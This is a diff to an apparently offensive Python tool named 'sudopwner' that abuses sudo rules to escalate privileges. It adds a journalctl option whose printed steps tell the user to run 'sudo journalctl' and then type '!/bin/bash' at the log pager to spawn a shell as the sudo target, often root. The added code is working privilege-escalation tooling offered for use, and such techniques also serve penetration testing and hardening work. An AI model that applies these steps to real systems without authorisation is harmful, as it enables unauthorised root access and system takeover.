@@ -225,6 +225,9 @@ def sudopwner():
         elif 'nano' in item[3]:
             nano_user = item[0]
             choices.append('nano')
+        elif 'journalctl' in item[3]:
+            journalctl_user = item[0]
+            choices.append('journalctl')
 
 
     # Options for the user to choose which sudo rule they wish to abuse
@@ -320,6 +323,8 @@ def sudopwner():
         zsh(zsh_user)
     elif question == "nano":
         nano(nano_user)
+    elif question == "journalctl":
+        journalctl(journalctl_user)
     else:
         print OKRED + "[!] No rule matching that input... exiting you n00b!" + ENDC
         sys.exit()
@@ -1721,6 +1726,20 @@ def nano(nano_user):
         print OKRED + " [*] sudo -u " + nano_user + " nano <filename>" + ENDC
     print OKBLUE + "[2] Once the file is open enter either 'F5' or '^R' which will allow you to load a new file into nano." + ENDC
     print OKRED + " [*] Now enter a file you wish to load into nano!" + ENDC
+    print OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
+    sys.exit()
+
+def journalctl(journalctl_user):
+
+    print OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC
+    print OKYELLOW + "\n[!] NO AUTO PWNAGE AVAILABLE.... FOLLOW BELOW STEPS TO PWN: " + ENDC
+    print OKBLUE + "[1] The first step is to view logs by running the 'journalctl' command: " + ENDC
+    if (journalctl_user == "ALL") or (journalctl_user == "root"):
+        print OKRED + " [*] sudo journalctl" + ENDC
+    else:
+        print OKRED + " [*] sudo -u " + journalctl_user + " journalctl" + ENDC
+    print OKBLUE + "[2] Once the log is displayed type '!/bin/bash': " + ENDC
+    print OKRED + " [*] !/bin/bash" + ENDC
     print OKRED + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC
     sys.exit()
 
